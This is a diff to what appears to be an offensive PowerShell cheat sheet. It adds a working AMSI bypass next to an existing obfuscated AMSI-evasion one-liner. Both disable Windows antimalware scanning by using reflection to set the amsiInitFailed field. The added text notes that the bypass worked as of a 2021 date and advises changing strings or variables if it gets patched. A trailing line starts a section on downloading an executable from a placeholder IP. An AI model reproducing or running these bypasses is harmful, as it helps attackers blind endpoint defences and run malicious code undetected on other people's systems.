@@ -38,6 +38,15 @@ Another AMSI evading method:
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ;( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
 ```
 
+AMSI bypass (working as of 6/12/2021)
+```
+$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
+$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+* If patched, just change up the strings/variables.
+
 # Misc things:
 
 WebClient DownloadData http://x.x.x.x/file.exe method:
